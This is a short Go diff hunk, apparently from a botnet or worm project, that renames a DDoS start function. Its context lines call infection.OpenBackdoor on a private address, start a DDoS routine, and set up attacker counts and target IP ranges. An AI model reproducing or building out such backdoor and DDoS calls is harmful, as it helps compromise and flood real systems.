@@ -74,7 +74,7 @@ func main() {
 	go infection.OpenBackdoor("10.0.2.5:8000")
 	var wg sync.WaitGroup
 	wg.Add(1)
-	go ddos.initDDOS(&wg,"test")
+	go ddos.InitDDOS(&wg,"test")
 
 	nAttackers := 6
 	baseIp := [2][4]int{{10,0,2,-1},{10,0,1,-1}}
